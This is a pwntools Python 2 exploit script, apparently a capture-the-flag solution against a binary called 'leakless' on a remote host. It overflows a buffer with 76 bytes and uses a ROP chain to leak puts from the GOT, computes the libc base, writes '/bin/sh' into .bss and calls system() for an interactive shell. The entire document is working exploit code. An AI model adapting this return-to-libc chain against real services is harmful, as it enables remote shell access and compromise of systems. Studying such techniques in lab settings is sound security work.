#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('leakless')

host = args.HOST or '51.68.189.144'
port = int(args.PORT or 31007)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

rop = ROP(exe)
rop.read(0, exe.symbols['__bss_start'], 8)
rop.puts(exe.got['puts'])
rop.main()
rop.exit(0)
# no syscall gadget :(
#rop.execve(exe.symbols['__bss_start'], 0, 0)

if args.LOCAL:
    libc = ELF('/lib/libc.so.6')
else:
    libc = ELF('./libc32.so')

log.info(rop.dump())

payload = "A" * 76 + rop.chain()

io.send(payload)
io.send('/bin/sh\x00')
addr = u32(io.recv()[:4]) - libc.symbols['puts']
log.success(hex(addr))

libc.address =addr
rop = ROP(libc)
rop.system(exe.symbols['__bss_start'])
payload = "A"*76+rop.chain()
io.send(payload)

io.interactive()

